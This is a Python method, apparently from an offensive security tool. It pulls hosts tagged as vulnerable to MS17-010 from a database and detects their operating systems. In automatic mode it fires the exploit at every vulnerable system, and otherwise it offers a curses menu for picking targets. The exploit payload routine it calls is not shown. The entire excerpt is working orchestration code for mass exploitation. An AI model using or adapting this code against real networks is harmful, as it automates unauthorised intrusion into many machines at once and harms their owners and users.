def exploit(self):
        """
            Starts the exploiting phase, you should run setup before running this function.
            if auto is set, this function will fire the exploit to all systems. Otherwise a curses interface is shown.
        """
        search = ServiceSearch()
        host_search = HostSearch()
        services = search.get_services(tags=['MS17-010'])
        services = [service for service in services]
        if len(services) == 0:
            print_error("No services found that are vulnerable for MS17-010")
            return

        if self.auto:
            print_success("Found {} services vulnerable for MS17-010".format(len(services)))
            for service in services:
                print_success("Exploiting " + str(service.address))
                host = host_search.id_to_object(str(service.address))
                system_os = ''

                if host.os:
                    system_os = host.os
                else:
                    system_os = self.detect_os(str(service.address))
                    host.os = system_os
                    host.save()
                text = self.exploit_single(str(service.address), system_os)
                print_notification(text)
        else:
            service_list = []
            for service in services:
                host = host_search.id_to_object(str(service.address))
                system_os = ''

                if host.os:
                    system_os = host.os
                else:
                    system_os = self.detect_os(str(service.address))
                    host.os = system_os
                    host.save()

                service_list.append({'ip': service.address, 'os': system_os, 'string': "{ip} ({os}) {hostname}".format(ip=service.address, os=system_os, hostname=host.hostname)})
            draw_interface(service_list, self.callback, "Exploiting {ip} with OS: {os}")